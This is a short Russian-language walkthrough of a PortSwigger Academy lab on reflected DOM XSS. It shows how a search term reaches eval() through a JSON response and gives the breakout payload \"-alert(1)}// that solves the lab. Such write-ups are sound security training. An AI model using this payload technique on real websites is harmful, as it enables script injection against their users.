введем тестовую строку в поисковый запрос `qwe123`

перейдем в прокси хттп хистори и заметим 2 примечательных запроса
```
GET /resources/js/searchResults.js
```
в котором используется функция `eval()`


а так же второй запрос
```
GET /search-results?search=qwe123
```
где у нас идет ответ в json квери
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/9.%20Reflected%20DOM%20XSS/pics%20for%20walktrough/1.png)

сделав несколько запросов заметим, что при добавлении символов появлется `"` в начале ответа
```
GET /search-results?search=/alert(1)
```
`{"results":[],"searchTerm":"/alert(1)"}`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/9.%20Reflected%20DOM%20XSS/pics%20for%20walktrough/2.png)
выйдем из этих кавычек введя в форму поиска
```
\"-alert(1)}//
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/9.%20Reflected%20DOM%20XSS/pics%20for%20walktrough/3.png)

на что получим уведомление об успешном выполнении работы

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/9.%20Reflected%20DOM%20XSS/pics%20for%20walktrough/5.png)

